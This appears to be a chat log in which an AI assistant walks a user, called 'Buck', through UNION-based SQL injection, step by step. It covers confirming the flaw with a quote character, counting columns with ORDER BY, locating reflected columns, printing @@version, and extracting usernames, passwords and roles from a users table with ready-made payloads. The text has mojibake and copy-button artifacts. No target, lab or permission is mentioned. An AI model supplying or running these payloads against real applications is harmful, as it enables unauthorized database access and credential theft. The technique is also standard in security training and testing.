ğŸ§  Core Idea:
Weâ€™re gonna leverage UNION to append our own query results onto what the server is already selecting, and then see those results printed in columns the page reflects.

ğŸ§ª Step-by-Step Breakdown:
âœ… 1. Confirm SQL Injection
Test with a ' and get a syntax error.

That confirms the input is unsanitized and injectable.

ğŸ”¢ 2. Find the Number of Columns
There are two methods:

â†’ A. ORDER BY method
Inject:

sql
Copy
Edit
' ORDER BY 1-- -
' ORDER BY 2-- -
...
' ORDER BY N-- -
Until you get an error.

If ' ORDER BY 5-- - errors â†’ there are 4 columns.

â†’ B. UNION SELECT method
Inject:

sql
Copy
Edit
' UNION SELECT 1,2,3-- -
If you get an error about mismatched columns, add another:

sql
Copy
Edit
' UNION SELECT 1,2,3,4-- -
When it succeeds â€” youâ€™ve matched the right number of columns.

ğŸ‘ï¸ 3. Find Reflected Columns
Once 1,2,3,4 is successful, see which numbers actually appear in the page:

If the page prints 2, 3, 4, but not 1, then columns 2â€“4 are reflected.

These are your injection points.

ğŸ§ª 4. Test for Arbitrary Data Reflection
Replace one reflected column with @@version, a built-in SQL variable:

sql
Copy
Edit
' UNION SELECT 1,@@version,3,4-- -
If you see the DB version print, youâ€™re golden â€” you can now inject and print arbitrary query results in that spot.

âœ… Why Use NULL, 1, 2, 3?
Just placeholders! They make it easy to:

Avoid data type errors.

Track which columns are reflected.

Pad out the rest of the columns so the UNION matches.

ğŸ”‘ KEY WORKFLOW:
text
Copy
Edit
Got Error on ' â†’ Check for SQLi âœ…
â†’ Find columns: ' ORDER BY N-- -
â†’ Then test UNION SELECT 1,2,3,...-- -
â†’ Note which numbers print = reflected columns
â†’ Replace a reflected column with real data (e.g. username, @@version)
ğŸ’¡ Pro Tip:
If you're struggling to remember:

ORDER BY = Find how many columns

UNION SELECT = Find what reflects

@@version = Proof of data exfil

Exactly, Buck â€” thatâ€™s dead on. ğŸ’¯

Once you've confirmed which columns are reflected (visible) â€” in this case, columns 2, 3, and 4 â€” you can insert your payload into any of those.

ğŸ”¥ Here's how it plays out:
Letâ€™s say you confirmed:

sql
Copy
Edit
' UNION SELECT 1,2,3,4-- -
And the page prints:

kotlin
Copy
Edit
Your role is 2  
Your lucky number is 3  
Another fun fact is 4
That means:

Column 1 = not printed (donâ€™t bother injecting here)

Columns 2, 3, 4 = reflected (these are your data exfil points)

ğŸ’¡ So when dumping real data:
You swap one of those with the actual DB column you want to dump:

Examples:

sql
Copy
Edit
' UNION SELECT 1, username, 3, 4 FROM users-- -
' UNION SELECT 1, 2, password, 4 FROM users-- -
' UNION SELECT 1, 2, 3, role FROM users-- -
Or, if you want to do all three:

sql
Copy
Edit
' UNION SELECT 1, username, password, role FROM users-- -
The goal is to place actual DB fields into spots that will print.

So yeah bro â€” inject into any of the reflected columns, and fill the others with placeholders like 1, 2, NULL, etc., as needed to keep things balanced.

